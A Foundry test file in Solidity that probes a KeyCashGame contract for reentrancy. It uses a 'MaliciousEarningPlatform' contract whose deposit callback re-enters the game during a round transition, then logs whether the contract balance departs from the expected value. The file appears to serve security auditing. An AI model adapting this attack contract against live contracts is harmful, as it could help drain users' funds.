// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/KeyCashGame.sol";

contract BenignEarningPlatform {
    function deposit() external payable {}
}

contract MaliciousEarningPlatform {
    KeyCashGame public game;
    bool public attackTriggered;
    
    constructor(KeyCashGame _game) {
        game = _game;
    }
    
    function setAttack() external {
        attackTriggered = true;
    }
    
    function deposit() external payable {
        if (attackTriggered) {
            // Re-entrant calls to vulnerable functions
            game.getClaimable(address(this));
            game.getTotalKeyBought(address(this));
        }
    }
    
    function getAttackStatus() external view returns (bool) {
        return attackTriggered;
    }
}

contract KeyCashGameReentrancyTest is Test {
    KeyCashGame public game;
    BenignEarningPlatform public benignPlatform;
    MaliciousEarningPlatform public maliciousPlatform;
    address constant owner = address(1);
    address constant player = address(2);
    
    function setUp() public {
        vm.startPrank(owner);
        game = new KeyCashGame();
        
        // Configure game parameters
        game.setTicketPriceShare(80, 10, 10);
        game.setPrizePoolShare(70, 20, 0, 10);
        game.updateRoundPeiod(3600);
        game.setStartPrice(0.1 ether);
        
        // Deploy platform contracts
        benignPlatform = new BenignEarningPlatform();
        maliciousPlatform = new MaliciousEarningPlatform(game);
        
        // Set initial platform to benign
        game.updateEarningPlatform(address(benignPlatform));
        
        // Start the game
        game.startGame();
        vm.stopPrank();
    }

    function test_reentrancyInBuyTickets() public {
        uint256 startTime = block.timestamp;
        
        // First purchase - goes through benign platform
        vm.deal(player, 1 ether);
        vm.prank(player);
        game.buyTickets{value: 0.1 ether}(1);
        
        // Set platform to malicious and activate attack
        vm.startPrank(owner);
        game.updateEarningPlatform(address(maliciousPlatform));
        maliciousPlatform.setAttack();
        vm.stopPrank();
        
        // Advance time to end round 0
        vm.warp(startTime + 7200);
        
        console.log("--- BEFORE-Trigger State ---");
        uint claimableBefore = game.getClaimable(player);
        uint contractBalanceBefore = address(game).balance;
        console.log("Player claimable:", claimableBefore);
        console.log("Contract balance:", contractBalanceBefore);

        console.log("--- Trigger Attack ---");
        // Second purchase triggers reentrancy during round transition
        vm.prank(player);
        game.buyTickets{value: 0.1 ether}(1);
        
        console.log("--- AFTER-Trigger State ---");
        uint claimableAfter = game.getClaimable(player);
        uint contractBalanceAfter = address(game).balance;
        console.log("Player claimable:", claimableAfter);
        console.log("Contract balance:", contractBalanceAfter);
        
        // Calculate expected balance change (0.1 ether deposit - 10% fee)
        uint256 expectedBalance = contractBalanceBefore + 0.09 ether;
        bool balanceMismatch = contractBalanceAfter != expectedBalance;
        
        console.log("--- DIFFERENTIAL RESULTS ---");
        console.log("Expected contract balance:", expectedBalance);
        console.log("Actual contract balance:  ", contractBalanceAfter);
        console.log("Player claimable change:  ", claimableAfter - claimableBefore);
        
        // Final vulnerability determination
        if (balanceMismatch) {
            console.log("Vulnerability Exists: Contract balance mismatch indicates state corruption");
        } else {
            console.log("Vulnerability not Exist: Contract balance changed as expected");
        }
    }
}